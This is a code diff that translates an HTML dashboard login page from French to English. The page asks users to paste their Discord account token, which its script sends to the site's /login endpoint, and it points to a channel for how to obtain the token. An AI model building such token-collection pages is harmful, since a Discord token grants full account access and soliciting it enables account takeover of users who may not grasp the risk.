@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <title>Dashboard</title>
@@ -10,10 +10,11 @@
     <div class="login-wrapper">
         <div class="login-box">
 
-            <p class="login-sub">Connecte-toi avec ton token Discord</p>
+            <p class="login-sub">Login with your Discord token</p>
+            <p class="login-sub" style="font-size: 0.85rem; margin-top: -10px;">Check the channel for how to get your token</p>
             <form id="loginForm">
-                <input type="password" id="tokenInput" placeholder="Colle ton token ici..." required>
-                <button type="submit">🔗 Se connecter</button>
+                <input type="password" id="tokenInput" placeholder="Paste your token here..." required>
+                <button type="submit">Login</button>
                 <div id="loginError" class="login-error"></div>
             </form>
 
@@ -26,7 +27,7 @@
             const btn = e.target.querySelector('button');
             const err = document.getElementById('loginError');
             btn.disabled = true;
-            btn.textContent = '⏳ Connexion...';
+            btn.textContent = 'Connecting...';
             err.textContent = '';
             try {
                 const res = await fetch('/login', {
@@ -38,14 +39,14 @@
                 if (data.success) {
                     window.location.href = data.redirect || '/dashboard';
                 } else {
-                    err.textContent = data.error || 'Token invalide';
+                    err.textContent = data.error || 'Invalid token';
                     btn.disabled = false;
-                    btn.textContent = '🔗 Se connecter';
+                    btn.textContent = 'Login';
                 }
             } catch {
-                err.textContent = '❌ Erreur réseau';
+                err.textContent = 'Network error';
                 btn.disabled = false;
-                btn.textContent = '🔗 Se connecter';
+                btn.textContent = 'Login';
             }
         });
     </script>
